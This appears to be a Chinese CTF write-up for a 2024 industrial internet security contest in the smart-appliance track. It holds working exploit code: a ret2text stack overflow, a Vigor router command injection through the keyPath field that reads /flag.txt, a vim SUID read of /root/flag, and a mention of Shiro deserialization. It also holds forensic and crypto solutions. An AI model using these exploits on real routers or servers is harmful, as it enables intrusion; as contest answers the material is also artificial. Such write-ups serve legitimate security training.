---
title: 2024 中国工业互联网安全大赛智能家电行业赛道选拔赛决赛
contest: 智能家电行业赛道
year: 2024
difficulty: medium
vuln_type: [stego_traffic, crypto_rsa, web_unknown, auth_bypass, web_rce, misc_unknown]
tags: [BLE link key 提取, RSA gcdext, vigor_router 命令注入, shiro 反序列化, modbus 35152 PNG 拼接, FINS 协议响应, IEC104 ioa, libc.so XOR 0x17, 智能家居遥控, vim SUID 提权]
attack_chain: BLE 提取 link key → 解压 / RSA 同模攻击 gcdext / vigor_router keyPath 注入 / shiro 反序列化梭 / modbus 35152 拼接 PNG / FINS 响应构造 / IEC104 ioa 提取 / 安卓 md5+flag+str 掐头去尾 / libc.so XOR 0x17 / 智能家居 scrcpy 远控 / flipper zero 红外遥控 / vim SUID 提权
key_payload: BLE link_key / gcdext(3, 17) 同模攻击 / keyPath=%27%0A/bin/ 注入 / shiro 一键梭 / modbus regval_uint16 / 35152 是 PNG 起点 / FINS 响应头 46494e53 / iec60870_asdu.ioa / md5+flag+str / test[i] ^ 0x17
one_liner: 工控赛事综合：Ble+路由器+shiro+Modbus+FINS+IEC104+智能家居 IoT。
lesson: 工控流量 modbus 寄存器值 35152 是 PNG \x89P magic；FINS 协议头 46494e53。
quality: medium
---
# 2024 中国工业互联网安全大赛智能家电行业赛道选拔赛决赛

## 1. sonic_swtich_交换机

```python
from pwn import *
context.log_level='debug'
sh = process('nc 192.3.2.19 6888', shell=True)
text_addr = 0x55555540090f - 0x90f + 0x87A
payload = 'a' * (32+8) + p64(text_addr)
sh.recvuntil(':')
sh.send(payload)
sh.interactive()
```

端口 6888 栈溢出，ret2text。

## 2. vigor_router_路由器

```python
import requests
host = 'http://192.3.2.238'
def run_cmd(cmd):
    url = host + "/cgi-bin/mainfunction.cgi"
    data = "action=login&keyPath=%27%0A%2fbin%2f" + cmd + "%0A%27&loginUser=a&loginPwd=a"
    return requests.post(url=url, data=data, timeout=(10, 15)).text
print(run_cmd('cat${IFS}/flag.txt'))
```

`keyPath='%0A/bin/<cmd>%0A'` 注入。

## 3. 智能家居

**非预期解法**：
- scrcpy 直接远控手机
- flipper zero 红外学习原遥控器 → 重放控制空调
- harkrf 看 433Mhz → flipper zero 嗅探重放控制门铃

## 4. 智能制造 业务系统 / 报表系统

- shiro 反序列化梭
- 积木报表 `queryFieldBySql` 接口命令执行 → vim SUID 提权
  ```bash
  vim -c ':wq/tmp/flag' /root/flag
  ```

## 5. CTF 夺旗竞赛

### BLE 协议分析
```bash
binwalk -e ble.pcap
# link_key 在流量包中
```

### UDP 协议分析
unhex 还原明文 flag。

### RSA 基础
```python
from gmpy2 import *
g, s, t = gcdext(3, 17)
m = pow(c1, s, n) * pow(c2, t, n) % n
# iroot(m, g)[0] 开 g 次方根
# cHZrcXs3MnAwMWwwNTlvMzE3N285MWszN2sxNGw1bW5sbTczM30=
```

### 异常工控流量（Modbus）
```python
# 35152 = 0x8950 = PNG \x89P 头
tshark -r ics.pcapng -T fields -e modbus.regval_uint16 > modbus.txt
# 拼接写入 flag{count}.png
```

### IEC104 规约
```bash
tshark -r 1.pcapng -T fields -e iec60870_asdu.ioa > iec.txt
# ioa 中有 flag 片段，拼接即可
```

### 简单逆向 / 安卓逆向
md5 + flag + str 形式 → 32 字节 md5 + 19 字节 str → 掐头去尾得 flag。

### 恶意流量分析
- 流 87 上传 PHP，变量名 `ant` + 流 96 的 `source` 字段是命令 → 反弹 shell

### 恶意固件分析（libc.so XOR）
```python
test = 'q{vplACMZY|F&Y}MUYA|nA}B&tBB&@yB%YBo&j'
for i in range(0x26):
    for j in range(255):
        if ord(test[i]) == j ^ 0x17:
            print(chr(j), end='')
            break
```

### 应用逻辑异常
JS 里直接调解密部分。
